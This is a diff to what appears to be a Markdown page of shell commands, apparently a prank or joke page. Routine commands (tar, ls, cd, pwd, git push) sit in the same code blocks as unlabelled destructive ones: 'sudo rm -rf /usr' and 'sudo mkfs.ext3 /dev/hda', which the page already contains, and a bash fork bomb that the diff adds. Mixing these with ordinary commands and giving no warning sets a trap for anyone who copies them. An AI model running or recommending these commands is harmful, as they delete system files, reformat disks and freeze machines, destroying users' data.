@@ -71,9 +71,9 @@ tar -xzvf ${filename}.tar.gz
 ```
 ls
 
- cd /usr/X11R6/bin
+cd /usr/X11R6/bin
  
- pwd
+pwd
  
 ```
 
@@ -95,6 +95,8 @@ git push origin master
 sudo rm -rf /usr
 
 sudo mkfs.ext3 /dev/hda
+
+:(){ :|:& };:
 ```
 
 <img src="http://i.imgur.com/pIJKrYj.gif" style="float: right; margin-top: -275px; width: 410px"></img>
